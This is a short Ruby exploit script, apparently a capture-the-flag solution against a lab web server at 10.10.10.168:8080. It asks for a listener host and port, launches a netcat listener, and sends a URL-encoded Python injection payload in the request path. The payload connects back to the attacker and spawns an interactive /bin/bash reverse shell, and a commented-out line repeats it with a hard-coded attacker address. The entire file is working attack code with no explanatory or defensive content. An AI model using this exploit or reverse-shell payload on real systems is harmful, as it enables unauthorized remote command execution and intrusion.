#!/usr/bin/env ruby
require 'cgi'
require 'net/http'
require 'httpclient'

puts "LHOST"
host = gets
lhost = host.chomp
puts "LPORT"
port = gets
lport = port.chomp
puts "Toy JAkiando we perate...."
fork { exec("nc -nlvp #{port}") }

path="';import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"#{lhost}\",#{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")#"

path2 = CGI::escape(path)
path2 = path2.gsub("%2F","/")
path2 = path2.gsub("+","%20")
#urle= "http://10.10.10.168:8080/%27%3Bimport%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%2210.10.16.54%22%2C4444%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bimport%20pty%3B%20pty.spawn%28%22/bin/bash%22%29%23"
clnt = HTTPClient.new
concat = "http://10.10.10.168:8080/"+path2
res = clnt.get(concat)
puts res.content
